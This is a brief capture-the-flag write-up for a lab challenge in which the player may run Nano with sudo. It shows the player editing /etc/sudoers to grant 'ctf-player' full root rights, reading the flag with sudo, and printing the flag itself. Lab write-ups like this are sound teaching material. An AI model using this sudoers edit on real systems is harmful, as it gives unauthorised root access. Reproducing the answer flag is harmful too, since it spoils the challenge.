### Challenge

The challenge lets `ctf-player` run Nano with sudo. [Challenge page](https://learn.cylabacademy.org/library/748)

### Solve

I opened `/etc/sudoers` in Nano, added an all-privileges rule for `ctf-player`, then read the flag:

```bash
sudo /bin/nano /etc/sudoers
sudo cat flag.txt
```

I added this rule: `ctf-player ALL=(ALL:ALL) ALL`.

### Flag

```text
academy{n4n0_411_7h3_w4y_959b3790}
```
